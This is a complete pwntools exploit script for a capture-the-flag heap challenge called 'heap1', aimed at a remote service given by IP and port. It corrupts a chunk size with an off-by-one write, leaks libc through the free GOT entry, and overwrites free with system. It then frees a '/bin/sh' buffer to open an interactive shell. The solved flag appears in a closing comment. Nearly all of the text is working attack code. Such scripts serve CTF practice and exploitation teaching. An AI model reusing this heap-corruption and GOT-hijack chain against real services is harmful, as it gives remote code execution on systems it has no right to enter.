from pwn import *
#context.log_level = "debug"
local = False
if local:
	p = process("./heap1")
	
else:
	p = remote("114.116.54.89","10006")

elf = ELF("./heap1")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def new(size,content):
	p.sendlineafter("choice :","1")
	p.sendlineafter("note :",str(size))
	p.sendafter("note:",content)

def edit(index,content):
	p.sendlineafter("choice :","2")
	p.sendlineafter("of note :",str(index))
	p.sendafter("note : ",content)

def free(index):
	p.sendlineafter("choice :","4")
	p.sendlineafter("note :",str(index))

def show(index):
	p.sendlineafter("choice :","3")
	p.sendlineafter("note :",str(index))
	p.recvuntil("Content : ")
	return u64(p.recv(numb=6).ljust(0x8,"\x00"))

new(0x78,"aaaa") #0
new(0x20,"bbbb") #1
new(0x78,"cccc") #2
edit(0,"/bin/sh\x00" + "a"*0x70 + "\x71")
free(1)
new(0x68,"\x00"*0x50 + p64(0x78) + p64(elf.got['free']))
free_addr = show(2)
success("free_addr ===> " + hex(free_addr))
libc.address = free_addr - libc.symbols['free']
success("libc_addr ===> " + hex(libc.address))
edit(2,p64(libc.symbols['system']))
free(0)
#gdb.attach(p)
p.interactive()
#flag{11d2a7f74d2bf5ae}
